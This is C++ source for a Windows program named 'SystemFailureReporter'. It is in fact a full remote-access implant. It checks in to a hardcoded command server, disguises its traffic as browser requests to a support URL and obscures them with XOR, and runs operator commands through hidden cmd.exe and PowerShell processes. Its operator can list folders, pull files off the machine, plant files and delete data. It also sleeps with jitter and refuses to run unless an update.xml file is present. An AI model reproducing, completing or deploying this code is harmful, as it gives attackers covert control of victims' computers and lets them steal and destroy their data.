// x86_64-w64-mingw32-g++ -o SystemFailureReporter.exe SystemFailureReporter.cpp -lwininet -lcrypt32 -lws2_32 -static -std=c++17 -lstdc++fs

#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <random>
#include <thread>
#include <chrono>
#include <fstream>
#include <sstream>
#include <cstdlib>
#include <ctime>
#include <algorithm>
#include <cstring>
#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <shlwapi.h>
#include <filesystem>
#include <iomanip>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shlwapi.lib")

using namespace std;

string AUTH_ID = "8b5a94ae-2a0b-429e-b0bd-ec772909ecef";
string SERVER_HOST = "192.168.238.230";
int SERVER_PORT = 443;
int XOR_KEY = 255;
string DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

namespace nlohmann {
    template<typename T>
    struct identity { using type = T; };

    template<typename T>
    using uncvref_t = typename std::remove_cv<typename std::remove_reference<T>::type>::type;

    template<typename T>
    struct is_constructible_string {
        static constexpr bool value = std::is_constructible<std::string, T>::value;
    };

    class json {
    private:
        enum class value_t : uint8_t {
            null,
            object,
            array,
            string,
            boolean,
            number_integer,
            number_unsigned,
            number_float
        };

        value_t type = value_t::null;
        std::map<std::string, json> object_data;
        std::vector<json> array_data;
        std::string string_data;
        bool bool_data = false;
        double number_data = 0;

        void clear() {
            type = value_t::null;
            object_data.clear();
            array_data.clear();
            string_data.clear();
            bool_data = false;
            number_data = 0;
        }

    public:
        json() : type(value_t::null) {}
        json(std::nullptr_t) : type(value_t::null) {}
        json(const std::string& s) : type(value_t::string), string_data(s) {}
        json(const char* s) : type(value_t::string), string_data(s) {}
        json(bool b) : type(value_t::boolean), bool_data(b) {}
        json(int n) : type(value_t::number_integer), number_data((double)n) {}
        json(double n) : type(value_t::number_float), number_data(n) {}
        json(const std::map<std::string, json>& obj) : type(value_t::object), object_data(obj) {}
        json(const std::vector<json>& arr) : type(value_t::array), array_data(arr) {}

        static json object() { json j; j.type = value_t::object; return j; }
        static json array() { json j; j.type = value_t::array; return j; }

        json& operator[](const std::string& key) {
            if (type != value_t::object) {
                clear();
                type = value_t::object;
            }
            return object_data[key];
        }

        const json& operator[](const std::string& key) const {
            static json empty;
            if (type != value_t::object) {
                return empty;
            }
            auto it = object_data.find(key);
            if (it == object_data.end()) {
                return empty;
            }
            return it->second;
        }

        json& operator[](size_t index) {
            if (type != value_t::array) {
                clear();
                type = value_t::array;
            }
            if (index >= array_data.size()) {
                array_data.resize(index + 1);
            }
            return array_data[index];
        }

        const json& operator[](size_t index) const {
            static json empty;
            if (type != value_t::array || index >= array_data.size()) {
                return empty;
            }
            return array_data[index];
        }

        void push_back(const json& val) {
            if (type != value_t::array) {
                clear();
                type = value_t::array;
            }
            array_data.push_back(val);
        }

        bool contains(const std::string& key) const {
            if (type != value_t::object) {
                return false;
            }
            return object_data.find(key) != object_data.end();
        }

        const json* find(const std::string& key) const {
            if (type != value_t::object) {
                return nullptr;
            }
            auto it = object_data.find(key);
            if (it == object_data.end()) {
                return nullptr;
            }
            return &it->second;
        }

        template<typename T>
        T get() const {
            if constexpr (std::is_same<T, std::string>::value) {
                if (type == value_t::string) return string_data;
                if (type == value_t::number_integer || type == value_t::number_float) return std::to_string(number_data);
                if (type == value_t::boolean) return bool_data ? "true" : "false";
                if (type == value_t::null) return "";
                return dump();
            }
            else if constexpr (std::is_same<T, bool>::value) {
                if (type == value_t::boolean) return bool_data;
                return false;
            }
            else if constexpr (std::is_integral<T>::value) {
                if (type == value_t::number_integer || type == value_t::number_float) return (T)number_data;
                return 0;
            }
            else if constexpr (std::is_floating_point<T>::value) {
                if (type == value_t::number_integer || type == value_t::number_float) return (T)number_data;
                return 0.0;
            }
            else if constexpr (std::is_same<T, std::vector<json>>::value) {
                if (type == value_t::array) return array_data;
                return std::vector<json>();
            }
            else if constexpr (std::is_same<T, std::map<std::string, json>>::value) {
                if (type == value_t::object) return object_data;
                return std::map<std::string, json>();
            }
            return T();
        }

        bool is_null() const { return type == value_t::null; }
        bool is_object() const { return type == value_t::object; }
        bool is_array() const { return type == value_t::array; }
        bool is_string() const { return type == value_t::string; }
        bool is_boolean() const { return type == value_t::boolean; }
        bool is_number() const { return type == value_t::number_integer || type == value_t::number_float; }

        size_t size() const {
            if (type == value_t::array) return array_data.size();
            if (type == value_t::object) return object_data.size();
            return 0;
        }

        std::string dump(int indent = 0) const {
            if (type == value_t::null) return "null";
            if (type == value_t::boolean) return bool_data ? "true" : "false";
            if (type == value_t::string) return "\"" + escape(string_data) + "\"";
            if (type == value_t::number_integer || type == value_t::number_float) {
                char buf[64];
                if (number_data == (int)number_data) snprintf(buf, sizeof(buf), "%d", (int)number_data);
                else snprintf(buf, sizeof(buf), "%g", number_data);
                return std::string(buf);
            }
            if (type == value_t::array) {
                std::string result = "[";
                for (size_t i = 0; i < array_data.size(); i++) {
                    if (i > 0) result += ",";
                    if (indent >= 0) result += "\n" + std::string(indent + 2, ' ');
                    result += array_data[i].dump(indent >= 0 ? indent + 2 : -1);
                }
                if (indent >= 0 && !array_data.empty()) result += "\n" + std::string(indent, ' ');
                result += "]";
                return result;
            }
            if (type == value_t::object) {
                std::string result = "{";
                bool first = true;
                for (const auto& pair : object_data) {
                    if (!first) result += ",";
                    first = false;
                    if (indent >= 0) result += "\n" + std::string(indent + 2, ' ');
                    result += "\"" + escape(pair.first) + "\":" + (indent >= 0 ? " " : "");
                    result += pair.second.dump(indent >= 0 ? indent + 2 : -1);
                }
                if (indent >= 0 && !object_data.empty()) result += "\n" + std::string(indent, ' ');
                result += "}";
                return result;
            }
            return "null";
        }

    private:
        static std::string escape(const std::string& s) {
            std::string result;
            for (char c : s) {
                if (c == '"') result += "\\\"";
                else if (c == '\\') result += "\\\\";
                else if (c == '\b') result += "\\b";
                else if (c == '\f') result += "\\f";
                else if (c == '\n') result += "\\n";
                else if (c == '\r') result += "\\r";
                else if (c == '\t') result += "\\t";
                else if (c < 0x20) { char buf[8]; snprintf(buf, sizeof(buf), "\\u%04x", c); result += buf; }
                else result += c;
            }
            return result;
        }
    };

    inline json parse(const std::string& s) {
        json result = json::object();
        try {
            size_t start = s.find('{');
            if (start == std::string::npos) return result;
            
            size_t end = s.rfind('}');
            if (end == std::string::npos || end < start) return result;
            
            std::string content = s.substr(start + 1, end - start - 1);
            size_t pos = 0;
            while (pos < content.length()) {
                size_t key_start = content.find('"', pos);
                if (key_start == std::string::npos) break;
                size_t key_end = content.find('"', key_start + 1);
                if (key_end == std::string::npos) break;
                std::string key = content.substr(key_start + 1, key_end - key_start - 1);
                
                pos = key_end + 1;
                size_t colon = content.find(':', pos);
                if (colon == std::string::npos) break;
                pos = colon + 1;
                
                while (pos < content.length() && isspace(content[pos])) pos++;
                
                if (pos >= content.length()) break;
                
                std::string value;
                if (content[pos] == '"') {
                    pos++;
                    size_t value_end = content.find('"', pos);
                    if (value_end == std::string::npos) break;
                    value = content.substr(pos, value_end - pos);
                    result[key] = value;
                    pos = value_end + 1;
                } else if (content[pos] == '{' || content[pos] == '[') {
                    int depth = 1;
                    pos++;
                    while (pos < content.length() && depth > 0) {
                        if (content[pos] == '{' || content[pos] == '[') depth++;
                        else if (content[pos] == '}' || content[pos] == ']') depth--;
                        pos++;
                    }
                } else {
                    size_t value_end = content.find_first_of(",}", pos);
                    if (value_end == std::string::npos) break;
                    value = content.substr(pos, value_end - pos);
                    value.erase(0, value.find_first_not_of(" \t\r\n"));
                    value.erase(value.find_last_not_of(" \t\r\n") + 1);
                    if (value == "true") result[key] = true;
                    else if (value == "false") result[key] = false;
                    else if (value == "null") result[key] = nullptr;
                    else {
                        char* endptr;
                        double d = strtod(value.c_str(), &endptr);
                        if (*endptr == '\0') result[key] = d;
                        else result[key] = value;
                    }
                    pos = value_end;
                }
                
                size_t comma = content.find(',', pos);
                if (comma != std::string::npos) {
                    pos = comma + 1;
                } else {
                    break;
                }
            }
        } catch (...) {
        }
        return result;
    }
}

using json = nlohmann::json;

string base64_encode(const string& input) {
    if (input.empty()) return "";
    DWORD encodedSize = 0;
    CryptBinaryToStringA((const BYTE*)input.c_str(), (DWORD)input.length(),
                         CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &encodedSize);
    if (encodedSize == 0) return "";
    vector<char> encoded(encodedSize);
    if (!CryptBinaryToStringA((const BYTE*)input.c_str(), (DWORD)input.length(),
                              CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, encoded.data(), &encodedSize)) {
        return "";
    }
    return string(encoded.data());
}

string base64_decode(const string& input) {
    if (input.empty()) return "";
    DWORD decodedSize = 0;
    CryptStringToBinaryA(input.c_str(), (DWORD)input.length(), CRYPT_STRING_BASE64,
                         NULL, &decodedSize, NULL, NULL);
    if (decodedSize == 0) return "";
    vector<BYTE> decoded(decodedSize);
    if (!CryptStringToBinaryA(input.c_str(), (DWORD)input.length(), CRYPT_STRING_BASE64,
                              decoded.data(), &decodedSize, NULL, NULL)) {
        return "";
    }
    return string((char*)decoded.data(), decodedSize);
}

string xor_encrypt_decrypt_string(const string& data, int key) {
    string result;
    result.reserve(data.size());
    for (unsigned char c : data) {
        result.push_back(c ^ key);
    }
    return base64_encode(result);
}

string xor_decrypt_base64_string(const string& enc_data, int key) {
    string decoded = base64_decode(enc_data);
    string result;
    result.reserve(decoded.size());
    for (unsigned char c : decoded) {
        result.push_back(c ^ key);
    }
    return result;
}

class XorCipher {
private:
    int key;

public:
    XorCipher(int key_val) : key(key_val) {}

    string encrypt(const string& raw) {
        return xor_encrypt_decrypt_string(raw, key);
    }

    string decrypt(const string& enc) {
        return xor_decrypt_base64_string(enc, key);
    }
};

string session_id;
vector<string> uris = {"/support/troubleshoot"};
string current_user_agent = DEFAULT_USER_AGENT;
double sleep_time = 60.0;
int start_jitter = 0;
int end_jitter = 0;
string prepend_output = "";
string append_output = "";
map<string, string> get_client_headers;
map<string, string> post_client_headers;
XorCipher* xor_cipher = nullptr;

string random_choice(const vector<string>& vec) {
    if (vec.empty()) return "";
    static random_device rd;
    static mt19937 gen(rd());
    uniform_int_distribution<> dis(0, (int)vec.size() - 1);
    return vec[dis(gen)];
}

string get_url() {
    return "http://" + SERVER_HOST + ":" + to_string(SERVER_PORT) + random_choice(uris);
}

map<string, string> get_request_headers(bool is_post) {
    map<string, string> headers;
    headers["User-Agent"] = current_user_agent;
    if (is_post) {
        headers["Content-Type"] = "application/json";
        for (const auto& h : post_client_headers)
            if (!h.second.empty()) headers[h.first] = h.second;
    } else {
        for (const auto& h : get_client_headers)
            if (!h.second.empty()) headers[h.first] = h.second;
    }
    return headers;
}

string http_request(const string& url, const string& method, const string& data, const map<string, string>& headers) {
    string host = SERVER_HOST;
    int port = SERVER_PORT;
    string path = "/support/troubleshoot";

    size_t http_pos = url.find("http://");
    if (http_pos != string::npos) {
        string temp = url.substr(http_pos + 7);
        size_t slash_pos = temp.find('/');
        if (slash_pos != string::npos) {
            string host_part = temp.substr(0, slash_pos);
            size_t colon_pos = host_part.find(':');
            if (colon_pos != string::npos) {
                host = host_part.substr(0, colon_pos);
                port = stoi(host_part.substr(colon_pos + 1));
            } else {
                host = host_part;
                port = 80;
            }
            path = temp.substr(slash_pos);
        }
    }

    HINTERNET hInternet = InternetOpenA(current_user_agent.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return "";
    }

    HINTERNET hConnect = InternetConnectA(hInternet, host.c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "";
    }

    DWORD flags = INTERNET_FLAG_NO_CACHE_WRITE;

    HINTERNET hRequest = HttpOpenRequestA(hConnect, method.c_str(), path.c_str(), NULL, NULL, NULL, flags, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }

    string headers_str;
    for (const auto& h : headers)
        headers_str += h.first + ": " + h.second + "\r\n";
    if (method == "POST")
        headers_str += "Content-Length: " + to_string(data.length()) + "\r\n";
    headers_str += "\r\n";

    if (!HttpSendRequestA(hRequest, headers_str.c_str(), (DWORD)headers_str.length(),
                          (LPVOID)(method == "POST" ? data.c_str() : NULL),
                          method == "POST" ? (DWORD)data.length() : 0)) {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }

    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &statusCodeSize, NULL);

    string response;
    char buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        response += buffer;
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return response;
}

void parse_headers(const string& raw_value, map<string, string>& target) {
    if (raw_value.empty()) return;
    
    stringstream ss(raw_value);
    string line;
    
    while (getline(ss, line, '\n')) {
        line.erase(0, line.find_first_not_of(" \t\r\n"));
        line.erase(line.find_last_not_of(" \t\r\n") + 1);
        
        if (line.empty()) continue;
        
        size_t colon_pos = line.find(':');
        if (colon_pos != string::npos) {
            string key = line.substr(0, colon_pos);
            string value = line.substr(colon_pos + 1);
            
            key.erase(0, key.find_first_not_of(" \t\r\n"));
            key.erase(key.find_last_not_of(" \t\r\n") + 1);
            value.erase(0, value.find_first_not_of(" \t\r\n"));
            value.erase(value.find_last_not_of(" \t\r\n") + 1);
            
            if (key == "q" || key.empty() || value.empty()) {
                continue;
            }
            
            if (key == "Host") {
                continue;
            }
            
            target[key] = value;
        }
    }
}

string get_json_string(const json& obj, const string& key) {
    if (obj.contains(key)) {
        const json& val = obj[key];
        if (val.is_string()) {
            return val.get<string>();
        }
    }
    return "";
}

vector<string> get_json_array(const json& obj, const string& key) {
    vector<string> result;
    if (obj.contains(key)) {
        const json& arr = obj[key];
        if (arr.is_array()) {
            for (size_t i = 0; i < arr.size(); i++) {
                if (arr[i].is_string()) {
                    result.push_back(arr[i].get<string>());
                }
            }
        }
    }
    return result;
}

void apply_jitter() {
    if (start_jitter > end_jitter) swap(start_jitter, end_jitter);
    static random_device rd;
    static mt19937 gen(rd());
    uniform_int_distribution<> dis(start_jitter, end_jitter);
    int jitter_amount = dis(gen);
    double final_sleep = sleep_time + jitter_amount;
    final_sleep = max(10.0, min(900.0, final_sleep));
    this_thread::sleep_for(chrono::milliseconds((int)(final_sleep * 1000)));
}

bool checkin() {
    try {
        string encrypted_id = xor_cipher->encrypt(AUTH_ID);
        
        json payload = json::object();
        payload["action"] = "checkin";
        payload["token"] = encrypted_id;
        
        string response = http_request(get_url(), "POST", payload.dump(), get_request_headers(true));
        
        if (response.empty()) {
            return false;
        }
        
        json resp = nlohmann::parse(response);
        if (resp.is_null()) {
            return false;
        }
        
        string sid_enc = get_json_string(resp, "sid");
        if (sid_enc.empty()) {
            return false;
        }
        
        session_id = xor_cipher->decrypt(sid_enc);
        if (session_id.empty()) {
            return false;
        }
        
        string ua = get_json_string(resp, "ua");
        if (!ua.empty()) {
            string dec = xor_cipher->decrypt(ua);
            if (!dec.empty()) current_user_agent = dec;
        }
        
        string sj = get_json_string(resp, "sj");
        if (!sj.empty()) {
            string dec = xor_cipher->decrypt(sj);
            if (!dec.empty()) start_jitter = stoi(dec);
        }
        
        string ej = get_json_string(resp, "ej");
        if (!ej.empty()) {
            string dec = xor_cipher->decrypt(ej);
            if (!dec.empty()) end_jitter = stoi(dec);
        }
        
        string sl = get_json_string(resp, "sl");
        if (!sl.empty()) {
            string dec = xor_cipher->decrypt(sl);
            if (!dec.empty()) sleep_time = stod(dec);
        }
        
        vector<string> uris_enc = get_json_array(resp, "ur");
        if (!uris_enc.empty()) {
            vector<string> new_uris;
            for (const auto& u : uris_enc) {
                string dec = xor_cipher->decrypt(u);
                if (!dec.empty()) new_uris.push_back(dec);
            }
            if (!new_uris.empty()) uris = new_uris;
        }
        
        string pre = get_json_string(resp, "pre");
        if (!pre.empty()) {
            string dec = xor_cipher->decrypt(pre);
            if (!dec.empty()) prepend_output = dec;
        }
        
        string app = get_json_string(resp, "app");
        if (!app.empty()) {
            string dec = xor_cipher->decrypt(app);
            if (!dec.empty()) append_output = dec;
        }
        
        string gh = get_json_string(resp, "gh");
        if (!gh.empty()) {
            string dec = xor_cipher->decrypt(gh);
            if (!dec.empty()) {
                get_client_headers.clear();
                parse_headers(dec, get_client_headers);
            }
        }
        
        string ph = get_json_string(resp, "ph");
        if (!ph.empty()) {
            string dec = xor_cipher->decrypt(ph);
            if (!dec.empty()) {
                post_client_headers.clear();
                parse_headers(dec, post_client_headers);
            }
        }
        
        return true;
    }
    catch (exception& e) {
        return false;
    }
}

string get_tasks() {
    if (session_id.empty()) {
        return "";
    }

    try {
        string encrypted_sid = xor_cipher->encrypt(session_id);
        
        json payload = json::object();
        payload["action"] = "get_tasks";
        payload["sid"] = encrypted_sid;
        
        string response = http_request(get_url(), "POST", payload.dump(), get_request_headers(true));
        
        if (response.empty()) {
            return "";
        }
        
        json resp = nlohmann::parse(response);
        if (resp.is_null()) {
            return "";
        }
        
        string cmd_enc = get_json_string(resp, "command");
        if (cmd_enc.empty()) {
            return "";
        }
        
        string cmd = xor_cipher->decrypt(cmd_enc);
        return cmd;
    }
    catch (exception& e) {
        return "";
    }
}

void submit_output(const string& output) {
    if (session_id.empty()) {
        return;
    }

    try {
        string encrypted = xor_cipher->encrypt(output);
        string final_output = prepend_output + encrypted + append_output;
        string sid_enc = xor_cipher->encrypt(session_id);
        
        json payload = json::object();
        payload["action"] = "submit";
        payload["sid"] = sid_enc;
        payload["out"] = final_output;
        
        http_request(get_url(), "POST", payload.dump(), get_request_headers(true));
    }
    catch (exception& e) {
    }
}

string run_cmd_command(const string& cmd) {
    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;

    HANDLE hStdoutRd = nullptr, hStdoutWr = nullptr;
    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) return "[-] Failed to create pipe";
    SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION pi{};
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;

    string full_cmd = "cmd.exe /c " + cmd;
    vector<char> cmd_line(full_cmd.begin(), full_cmd.end());
    cmd_line.push_back('\0');

    BOOL success = CreateProcessA(nullptr, cmd_line.data(), nullptr, nullptr, TRUE,
                                  CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hStdoutWr);

    if (!success) {
        DWORD error = GetLastError();
        CloseHandle(hStdoutRd);
        return "[-] CMD execution error: " + to_string(error);
    }

    string result;
    DWORD bytesRead;
    char buffer[4096];
    while (ReadFile(hStdoutRd, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    DWORD exitCode = 0;
    WaitForSingleObject(pi.hProcess, INFINITE);
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdoutRd);

    string output = result;
    size_t start = output.find_first_not_of(" \t\r\n");
    if (start != string::npos) {
        size_t end = output.find_last_not_of(" \t\r\n");
        output = output.substr(start, end - start + 1);
    }
    if (exitCode != 0) output += "\n[Exit Code: " + to_string(exitCode) + "]";
    return output.empty() ? "[+] Command executed (no output)" : output;
}

string run_powershell_command(const string& ps_cmd) {
    string escaped_cmd;
    for (char c : ps_cmd) {
        if (c == '"') escaped_cmd += "\\\"";
        else escaped_cmd += c;
    }

    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;

    HANDLE hStdoutRd = nullptr, hStdoutWr = nullptr;
    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) return "[-] Failed to create pipe";
    SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION pi{};
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;

    string full_cmd = "powershell.exe -NoProfile -NonInteractive -Command " + escaped_cmd;
    vector<char> cmd_line(full_cmd.begin(), full_cmd.end());
    cmd_line.push_back('\0');

    BOOL success = CreateProcessA(nullptr, cmd_line.data(), nullptr, nullptr, TRUE,
                                  CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hStdoutWr);

    if (!success) {
        DWORD error = GetLastError();
        CloseHandle(hStdoutRd);
        return "[-] PowerShell execution error: " + to_string(error);
    }

    string result;
    DWORD bytesRead;
    char buffer[4096];
    while (ReadFile(hStdoutRd, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    DWORD exitCode = 0;
    WaitForSingleObject(pi.hProcess, INFINITE);
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdoutRd);

    string output = result;
    size_t start = output.find_first_not_of(" \t\r\n");
    if (start != string::npos) {
        size_t end = output.find_last_not_of(" \t\r\n");
        output = output.substr(start, end - start + 1);
    }
    if (exitCode != 0) output += "\n[Exit Code: " + to_string(exitCode) + "]";
    return output.empty() ? "[+] PowerShell command executed (no output)" : output;
}

json browse_directory(const string& path) {
    json result = json::object();
    try {
        string actual_path = path;
        if (actual_path.find('~') == 0) {
            char* home = getenv("USERPROFILE");
            if (home) {
                actual_path = string(home) + actual_path.substr(1);
            }
        }

        if (!std::filesystem::exists(actual_path)) {
            result["success"] = false;
            result["error"] = "Path does not exist: " + actual_path;
            result["current_path"] = actual_path;
            result["parent_path"] = nullptr;
            result["items"] = json::array();
            return result;
        }

        json items = json::array();
        for (const auto& entry : std::filesystem::directory_iterator(actual_path)) {
            try {
                json item = json::object();
                item["name"] = entry.path().filename().string();
                item["type"] = entry.is_directory() ? "directory" : "file";
                item["size"] = entry.is_directory() ? 0 : (double)entry.file_size();
                
                auto ftime = entry.last_write_time();
                auto time_t = std::chrono::system_clock::to_time_t(
                    std::chrono::time_point_cast<std::chrono::system_clock::duration>(
                        ftime - std::filesystem::file_time_type::clock::now() + 
                        std::chrono::system_clock::now()
                    )
                );
                stringstream ss;
                ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
                item["modified_time"] = ss.str();
                
                items.push_back(item);
            } catch (const std::exception&) {
                continue;
            }
        }

        result["success"] = true;
        result["current_path"] = actual_path;
        
        std::filesystem::path parent = std::filesystem::path(actual_path).parent_path();
        if (actual_path.size() >= 2 && actual_path[1] == ':' && actual_path.size() == 3 && actual_path[2] == '\\') {
            result["parent_path"] = nullptr;
        } else if (parent.empty()) {
            result["parent_path"] = nullptr;
        } else {
            result["parent_path"] = parent.string();
        }
        result["items"] = items;
    } catch (const std::exception& e) {
        result["success"] = false;
        result["error"] = e.what();
        result["current_path"] = path;
        result["parent_path"] = nullptr;
        result["items"] = json::array();
    }
    return result;
}

string download_file(const string& filepath) {
    try {
        if (!std::filesystem::exists(filepath)) {
            return "ERROR: File not found: " + filepath;
        }
        
        if (std::filesystem::is_directory(filepath)) {
            return "ERROR: Cannot download directory: " + filepath;
        }
        
        ifstream file(filepath, ios::binary);
        if (!file) {
            return "ERROR: Cannot open file: " + filepath;
        }
        
        vector<unsigned char> file_data((istreambuf_iterator<char>(file)), 
                                        istreambuf_iterator<char>());
        file.close();
        
        string filename = std::filesystem::path(filepath).filename().string();
        size_t filesize = file_data.size();
        string encoded = base64_encode(string((char*)file_data.data(), file_data.size()));
        
        return "file-data:" + filename + "|" + to_string(filesize) + "|" + encoded;
    } catch (const std::exception& e) {
        return "ERROR: " + string(e.what());
    }
}

string upload_file(const string& filepath, const string& filedata_b64) {
    try {
        string decoded_data = base64_decode(filedata_b64);
        vector<unsigned char> file_data(decoded_data.begin(), decoded_data.end());
        
        std::filesystem::path path_obj(filepath);
        std::filesystem::create_directories(path_obj.parent_path());
        
        ofstream file(filepath, ios::binary);
        if (!file) {
            return "ERROR: Cannot write file: " + filepath;
        }
        file.write(reinterpret_cast<const char*>(file_data.data()), file_data.size());
        file.close();
        
        return "SUCCESS: File uploaded to " + filepath;
    } catch (const std::exception& e) {
        return "ERROR: " + string(e.what());
    }
}

string delete_file(const string& filepath) {
    try {
        if (!std::filesystem::exists(filepath)) {
            return "ERROR: Path does not exist: " + filepath;
        }
        
        if (std::filesystem::is_directory(filepath)) {
            std::filesystem::remove_all(filepath);
            return "SUCCESS: Deleted directory " + filepath;
        } else {
            std::filesystem::remove(filepath);
            return "SUCCESS: Deleted file " + filepath;
        }
    } catch (const std::exception& e) {
        return "ERROR: " + string(e.what());
    }
}

string rename_file(const string& old_path, const string& new_path) {
    try {
        if (!std::filesystem::exists(old_path)) {
            return "ERROR: Source path does not exist: " + old_path;
        }
        
        std::filesystem::rename(old_path, new_path);
        return "SUCCESS: Renamed to " + new_path;
    } catch (const std::exception& e) {
        return "ERROR: " + string(e.what());
    }
}

string execute_command(const string& cmd) {
    string trimmed = cmd;
    size_t start = trimmed.find_first_not_of(" \t\r\n");
    if (start != string::npos) {
        size_t end = trimmed.find_last_not_of(" \t\r\n");
        trimmed = trimmed.substr(start, end - start + 1);
    }
    if (trimmed.empty()) return "[no command]";

    if (trimmed.find("ping") == 0 || trimmed == "ping") {
        return "pong";
    }

    if (trimmed.find("browse:") == 0) {
        string browse_path = trimmed.substr(7);
        while (!browse_path.empty() && browse_path.front() == ' ') browse_path.erase(0, 1);
        if (browse_path.empty()) {
            browse_path = std::filesystem::current_path().string();
        }
        json dir_data = browse_directory(browse_path);
        string json_str = dir_data.dump();
        string base64_data = base64_encode(json_str);
        return "browse-data-" + base64_data;
    }

    if (trimmed.find("download-file:") == 0) {
        string filepath = trimmed.substr(14);
        while (!filepath.empty() && filepath.front() == ' ') filepath.erase(0, 1);
        return download_file(filepath);
    }

    if (trimmed.find("upload-file:") == 0) {
        string rest = trimmed.substr(12);
        size_t sep_pos = rest.find('|');
        if (sep_pos != string::npos) {
            string filepath = rest.substr(0, sep_pos);
            string filedata_b64 = rest.substr(sep_pos + 1);
            return upload_file(filepath, filedata_b64);
        } else {
            return "ERROR: Invalid upload format. Use: upload-file:path|base64_data";
        }
    }

    if (trimmed.find("delete-file:") == 0) {
        string filepath = trimmed.substr(12);
        while (!filepath.empty() && filepath.front() == ' ') filepath.erase(0, 1);
        return delete_file(filepath);
    }

    if (trimmed.find("rename-file:") == 0) {
        string rest = trimmed.substr(12);
        size_t sep_pos = rest.find('|');
        if (sep_pos != string::npos) {
            string old_path = rest.substr(0, sep_pos);
            string new_path = rest.substr(sep_pos + 1);
            return rename_file(old_path, new_path);
        } else {
            return "ERROR: Invalid rename format. Use: rename-file:old_path|new_path";
        }
    }

    string upper_cmd = trimmed;
    transform(upper_cmd.begin(), upper_cmd.end(), upper_cmd.begin(), ::toupper);

    if (upper_cmd.length() >= 3 && upper_cmd.substr(0, 3) == "EP ") {
        string ps_cmd = trimmed.substr(3);
        size_t s = ps_cmd.find_first_not_of(" \t\r\n");
        if (s != string::npos) ps_cmd = ps_cmd.substr(s);
        return run_powershell_command(ps_cmd);
    }
    if (upper_cmd.length() >= 2 && upper_cmd.substr(0, 2) == "EP") {
        string ps_cmd = trimmed.substr(2);
        size_t s = ps_cmd.find_first_not_of(" \t\r\n");
        if (s != string::npos) ps_cmd = ps_cmd.substr(s);
        return run_powershell_command(ps_cmd);
    }
    return run_cmd_command(trimmed);
}

void main_loop() {
    xor_cipher = new XorCipher(XOR_KEY);

    while (session_id.empty()) {
        if (checkin()) {
            cout << "[+] Check-in successful → Session ID: " << session_id << endl;
            break;
        }
        int wait_time = rand() % 40000 + 20000;
        this_thread::sleep_for(chrono::milliseconds(wait_time));
    }

    while (true) {
        try {
            string cmd = get_tasks();
            if (!cmd.empty() && cmd != "null") {
                string result = execute_command(cmd);
                submit_output(result);
            }
            apply_jitter();
        }
        catch (exception& e) {
            int wait_time = rand() % 90000 + 30000;
            this_thread::sleep_for(chrono::milliseconds(wait_time));
        }
    }
}

int main() {

// Check for the presence of update.xml in the same folder
    {
        char exePath[MAX_PATH] = {0};
        GetModuleFileNameA(NULL, exePath, MAX_PATH);

        std::filesystem::path exeDir = std::filesystem::path(exePath).parent_path();
        std::filesystem::path xmlPath = exeDir / "update.xml";

        if (!std::filesystem::exists(xmlPath)) {
            return 1;
        }
    }

    srand(static_cast<unsigned>(time(nullptr)));

    HINTERNET hInternet = InternetOpenA(DEFAULT_USER_AGENT.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return 1;
    }
    InternetCloseHandle(hInternet);

    main_loop();
    return 0;
}
